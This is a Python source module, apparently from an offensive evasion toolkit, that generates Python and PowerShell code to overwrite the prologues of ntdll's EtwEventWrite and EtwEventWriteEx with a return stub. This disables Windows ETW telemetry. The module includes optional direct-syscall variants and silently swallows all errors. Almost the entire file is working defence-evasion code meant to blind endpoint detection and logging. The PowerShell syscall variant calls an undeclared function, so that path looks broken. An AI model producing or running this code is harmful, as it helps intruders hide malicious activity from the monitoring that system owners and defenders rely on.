"""ETW patching code generation.

Patches ntdll!EtwEventWrite and ntdll!EtwEventWriteEx by overwriting their
prologues with ``xor rax, rax; ret`` (\\x48\\x33\\xc0\\xc3 -- 4 bytes).
This silences ETW-based telemetry for the current process.

Supported languages: python, powershell.
Returns empty string for javascript, vbscript, or any unsupported language.
"""

from __future__ import annotations

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from evasion import EvasionConfig


# ---------------------------------------------------------------------------
# Python (ctypes) implementation
# ---------------------------------------------------------------------------

_PYTHON_TEMPLATE = '''\
def patch_etw():
    """Patch ETW event-write functions to neutralize telemetry."""
    try:
        import sys
        if sys.platform != "win32":
            return
        import ctypes
        import ctypes.wintypes as wt

        k32 = ctypes.windll.kernel32
        ntdll = k32.GetModuleHandleW("ntdll.dll")
        if not ntdll:
            return

        patch = b"\\x48\\x33\\xc0\\xc3"
        targets = [b"EtwEventWrite", b"EtwEventWriteEx"]

        for name in targets:
            addr = k32.GetProcAddress(ntdll, name)
            if not addr:
                continue

            old_protect = wt.DWORD(0)
{virtualprotect_block}
            ctypes.memmove(addr, patch, len(patch))
{restore_block}
    except Exception:
        pass
'''

_PYTHON_VP_DIRECT = '''\
            k32.VirtualProtect(
                ctypes.c_void_p(addr),
                ctypes.c_size_t(len(patch)),
                0x40,
                ctypes.byref(old_protect),
            )'''

_PYTHON_RESTORE_DIRECT = '''\
            k32.VirtualProtect(
                ctypes.c_void_p(addr),
                ctypes.c_size_t(len(patch)),
                old_protect.value,
                ctypes.byref(old_protect),
            )'''

_PYTHON_VP_SYSCALL = '''\
            try:
                from evasion.syscalls import syscall_protect
                syscall_protect(addr, len(patch), 0x40, ctypes.byref(old_protect))
            except Exception:
                k32.VirtualProtect(
                    ctypes.c_void_p(addr),
                    ctypes.c_size_t(len(patch)),
                    0x40,
                    ctypes.byref(old_protect),
                )'''

_PYTHON_RESTORE_SYSCALL = '''\
            try:
                from evasion.syscalls import syscall_protect
                syscall_protect(addr, len(patch), old_protect.value, ctypes.byref(old_protect))
            except Exception:
                k32.VirtualProtect(
                    ctypes.c_void_p(addr),
                    ctypes.c_size_t(len(patch)),
                    old_protect.value,
                    ctypes.byref(old_protect),
                )'''


def _generate_python(config: EvasionConfig) -> str:
    if config.syscalls:
        vp_block = _PYTHON_VP_SYSCALL
        restore_block = _PYTHON_RESTORE_SYSCALL
    else:
        vp_block = _PYTHON_VP_DIRECT
        restore_block = _PYTHON_RESTORE_DIRECT

    code = _PYTHON_TEMPLATE.format(
        virtualprotect_block=vp_block,
        restore_block=restore_block,
    )
    return code


# ---------------------------------------------------------------------------
# PowerShell (inline C# via Add-Type) implementation
# ---------------------------------------------------------------------------

_POWERSHELL_TEMPLATE = '''\
function patch_etw {{
    try {{
        if ($env:OS -ne "Windows_NT") {{ return }}

        $code = @"
using System;
using System.Runtime.InteropServices;

public class EtwPatcher {{
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    public static void Patch() {{
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        if (ntdll == IntPtr.Zero) return;

        byte[] patch = new byte[] {{ 0x48, 0x33, 0xc0, 0xc3 }};
        string[] targets = new string[] {{ "EtwEventWrite", "EtwEventWriteEx" }};

        foreach (string name in targets) {{
            IntPtr addr = GetProcAddress(ntdll, name);
            if (addr == IntPtr.Zero) continue;

            uint oldProtect = 0;
            VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, addr, patch.Length);
            VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
        }}
    }}
}}
"@

        Add-Type -TypeDefinition $code -Language CSharp
        [EtwPatcher]::Patch()
    }} catch {{}}
}}
'''

_POWERSHELL_SYSCALL_TEMPLATE = '''\
function patch_etw {{
    try {{
        if ($env:OS -ne "Windows_NT") {{ return }}

        $code = @"
using System;
using System.Runtime.InteropServices;

public class EtwPatcher {{
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    public static void Patch() {{
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        if (ntdll == IntPtr.Zero) return;

        byte[] patch = new byte[] {{ 0x48, 0x33, 0xc0, 0xc3 }};
        string[] targets = new string[] {{ "EtwEventWrite", "EtwEventWriteEx" }};

        foreach (string name in targets) {{
            IntPtr addr = GetProcAddress(ntdll, name);
            if (addr == IntPtr.Zero) continue;

            uint oldProtect = 0;
            try {{
                syscall_protect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
            }} catch {{
                VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
            }}
            Marshal.Copy(patch, 0, addr, patch.Length);
            try {{
                syscall_protect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
            }} catch {{
                VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
            }}
        }}
    }}
}}
"@

        Add-Type -TypeDefinition $code -Language CSharp
        [EtwPatcher]::Patch()
    }} catch {{}}
}}
'''


def _generate_powershell(config: EvasionConfig) -> str:
    if config.syscalls:
        return _POWERSHELL_SYSCALL_TEMPLATE
    return _POWERSHELL_TEMPLATE


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def generate_code(lang: str, config: EvasionConfig) -> str:
    """Generate ETW patching code for the given language.

    Returns an empty string for unsupported languages (javascript, vbscript, etc.).
    """
    if lang == "python":
        return _generate_python(config)
    elif lang == "powershell":
        return _generate_powershell(config)
    return ""
